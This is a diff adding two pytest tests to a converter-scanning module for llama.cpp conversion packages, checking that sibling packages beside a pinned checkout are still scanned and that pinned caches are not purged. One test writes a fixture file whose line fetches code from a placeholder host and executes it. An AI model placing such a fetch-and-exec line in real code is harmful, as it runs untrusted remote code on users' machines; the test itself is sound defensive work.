@@ -1695,6 +1695,57 @@ def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatc
         llama_cpp._scan_conversion_package(str(root))
 
 
+def test_a_pinned_converters_sibling_packages_are_still_scanned(tmp_path, monkeypatch, caplog):
+    """A pin waived the refusal for the entrypoint and the whole scan for its
+    siblings.
+
+    The entrypoint is read either way and only the raise is waived, but the
+    sibling packages were skipped outright, so a stale or tampered conversion/
+    beside a pinned entrypoint executed without even the advisory warning.
+    """
+    llama_cpp = _load("llama_cpp_pinned_sibling_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    (root / "conversion" / "payload.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        # Reported, and NOT refused: the pin is the user's own choice of file.
+        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
+    assert caplog.records, "a pinned checkout's siblings were scanned silently"
+
+    # The same tree unpinned still refuses under strict mode.
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
+
+
+def test_a_pinned_checkout_is_reported_but_never_rewritten(tmp_path, monkeypatch):
+    """Reporting what is in a directory the user pinned is fair; rewriting it is
+    not, and a checkout someone works in has caches of its own."""
+    llama_cpp = _load("llama_cpp_pinned_purge_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    cache = root / "conversion" / "__pycache__"
+    cache.mkdir()
+    theirs = cache / "base.cpython-313.pyc"
+    theirs.write_bytes(_pyc(0))
+
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    assert llama_cpp._purge_imported_package_bytecode(
+        str(root), is_local_copy = True,
+    ) == ()
+    assert theirs.exists(), "a pinned checkout was rewritten"
+
+    # Downloaded bytes get no such deference.
+    llama_cpp._purge_imported_package_bytecode(str(root), is_local_copy = False)
+    assert not theirs.exists()
+
+
 def _package_root(tmp_path):
     root = tmp_path / "llama.cpp"
     conversion = root / "conversion"
